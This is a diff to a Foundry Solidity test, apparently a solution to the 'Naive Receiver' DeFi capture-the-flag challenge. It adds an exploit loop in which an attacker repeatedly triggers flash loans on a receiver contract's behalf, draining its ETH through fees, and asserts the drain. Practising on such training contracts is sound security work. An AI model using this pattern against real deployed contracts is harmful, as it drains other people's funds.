@@ -48,14 +48,14 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit(uint256 borrowAmount) public {
-        vm.assume(borrowAmount > 1 && borrowAmount < ETHER_IN_POOL);
+    function testExploit() public {
+        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        naiveReceiverLenderPool.flashLoan(
-            address(flashLoanReceiver),
-            borrowAmount
-        );
+        while (address(flashLoanReceiver).balance > 0) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18);
+        }
+
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
@@ -63,10 +63,7 @@ contract NaiveReceiver is Test {
 
     function validation() internal {
         // All ETH has been drained from the receiver
-        assertEq(
-            address(flashLoanReceiver).balance,
-            0
-        );
+        assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(
             address(naiveReceiverLenderPool).balance,
             ETHER_IN_POOL + ETHER_IN_RECEIVER
